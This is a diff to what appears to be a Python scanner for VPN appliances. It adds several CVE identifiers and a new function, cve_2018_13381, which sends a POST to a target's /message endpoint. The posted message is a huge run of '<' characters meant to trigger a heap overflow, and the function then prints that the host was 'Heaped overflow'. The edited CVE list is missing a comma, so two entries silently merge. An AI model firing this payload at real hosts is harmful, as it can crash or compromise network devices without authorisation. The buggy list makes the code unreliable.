@@ -8,7 +8,8 @@ if sys.version_info < (3, 0):
 requests.packages.urllib3.disable_warnings()
 
 
-cvelist = ['CVE-2019-1579']
+cvelist = ['CVE-2019-1579', 'CVE-2018-13380', 'CVE-2018-13381'
+	  'CVE-2018-13379']
 # Updating this list ...
 vpnsub = ['vpn', 'covpn', 'tcovpn',
           'panvpn', 'vpn-blr', 'vpn-blr1',
@@ -173,7 +174,17 @@ def cve_2018_13379(host, port):
         print('The host %s is not vulnerable to CVE-2018-13379' % host)
         
 
+	
+def cve_2018_13381(host, port):
+	data = {
+	       'title': 'x', 
+               'msg': '&#' + '<'*(0x20000) + ';<', 
+        }
+	r = requests.post('https://%s%s/message' % (host, port), data=data)
+	print('Heaped overflow the host %s' % host)
 
+	
+	
 def scan(host):
     found = False
     for sub in vpnsub:
